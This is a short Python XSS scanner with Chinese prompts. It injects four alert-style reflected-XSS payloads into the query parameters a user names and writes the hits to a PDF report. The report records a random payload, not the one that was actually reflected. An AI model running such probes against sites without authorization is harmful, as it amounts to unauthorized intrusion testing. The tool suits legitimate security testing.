import random
import requests
import time
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
from reportlab.lib.pagesizes import letter
from reportlab.lib import colors
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle


REQUEST_TIMEOUT = 10
RATE_LIMIT_DELAY = 3


def test_xss(url, param, payloads):
    for payload in payloads:
        try:
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            query_params[param] = payload
            new_query = urlencode(query_params, doseq=True)
            target_url = urlunparse(parsed_url._replace(query=new_query))

            response = requests.get(target_url, timeout=REQUEST_TIMEOUT)
            time.sleep(RATE_LIMIT_DELAY)

            if payload in response.text:
                return True

        except requests.exceptions.RequestException as e:
            print(f"请求错误: {e}")

    return False


def test_xss_vulnerabilities(url, params):
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
    ]

    results = []

    for param in params:
        if test_xss(url, param, xss_payloads):
            results.append((param, "XSS", random.choice(xss_payloads)))

    return results


def generate_pdf_report(results, filename):
    data = [["参数", "漏洞类型", "负载"]] + results

    table = Table(data)
    table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
        ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
        ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
        ('FONTSIZE', (0, 0), (-1, 0), 14),
        ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
        ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
        ('GRID', (0, 0), (-1, -1), 1, colors.black)
    ]))

    doc = SimpleDocTemplate(filename, pagesize=letter)
    doc.build([table])


if __name__ == "__main__":
    target_url = input('请输入目标网站的URL: ')
    params = input('请输入要测试的参数（用逗号分隔）: ').split(',')

    results = test_xss_vulnerabilities(target_url, params)

    for result in results:
        print(f"发现漏洞: {result[1]} - 参数: {result[0]} - 负载: {result[2]}")

    pdf_filename = f"{target_url}-xss_report.pdf"
    generate_pdf_report(results, pdf_filename)
    print(f"报告已生成: {pdf_filename}")
